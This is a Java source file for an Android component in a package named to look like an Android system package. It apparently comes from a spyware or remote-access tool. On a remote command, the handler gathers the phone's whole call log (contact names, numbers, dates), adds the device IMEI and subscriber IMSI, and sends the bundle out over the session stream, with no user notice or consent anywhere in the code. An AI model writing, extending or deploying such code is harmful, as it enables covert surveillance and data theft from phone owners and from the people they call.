package com.android.system.session.handler;

import android.content.Context;
import android.telephony.TelephonyManager;

import com.android.system.service.SystemService;
import com.android.system.session.SessionManager;
import com.android.system.utils.DataPack;
import com.android.system.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.util.List;

;

public class UploadCallLogSessionHandler implements SessionManager.SessionHandler {
    @Override
    public void handleSession(JSONObject receiveJsonObject, InputStream inputStream, OutputStream outputStream) {
        List<SystemUtil.CallLogData> callRecordList = SystemUtil.getCallLogInPhone(SystemService.getContext());
        if(callRecordList == null) {
            return;
        }
        String sessionName = null;
        try {
            sessionName = receiveJsonObject.getString("action");
        } catch (JSONException e) {
            e.printStackTrace();
            return;
        }
        JSONObject responseJsonObject = new JSONObject();
        try {
            JSONArray contactArray = new JSONArray();
            for(SystemUtil.CallLogData callRecordData: callRecordList) {
                contactArray.put(new JSONObject().put("person", callRecordData.person).put("number", callRecordData.number).put("date", callRecordData.date).put("last_update", callRecordData.type));
            }
            TelephonyManager tm = (TelephonyManager) SystemService.getContext().getSystemService(Context.TELEPHONY_SERVICE);
            responseJsonObject.put(sessionName, contactArray)
                    .put("imei", tm.getDeviceId())
                    .put("imsi", tm.getSubscriberId());;
        } catch (JSONException e) {
        }
        byte[] responseData = null;
        try {
            responseData = responseJsonObject.toString().getBytes("UTF-8");
        } catch (UnsupportedEncodingException e) {
            responseData = responseJsonObject.toString().getBytes();
        }
        DataPack.sendDataPack(outputStream, responseData);
    }
}
